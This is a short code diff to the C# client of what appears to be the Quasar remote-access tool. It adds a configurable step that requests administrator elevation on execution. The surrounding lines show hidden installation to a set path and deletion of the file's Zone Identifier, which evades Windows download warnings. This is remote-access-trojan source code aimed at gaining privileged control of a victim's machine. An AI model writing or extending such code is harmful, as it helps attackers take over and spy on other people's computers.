@@ -93,7 +93,13 @@ namespace xClient
             AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
             ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
-            
+
+            // Request elevation
+            if (Settings.REQUESTELEVATIONONEXECUTION)
+            {
+                CommandHandler.HandleDoAskElevate(new Quasar.Common.Messages.DoAskElevate(), ConnectClient);
+            }
+
             FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);
 
             if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
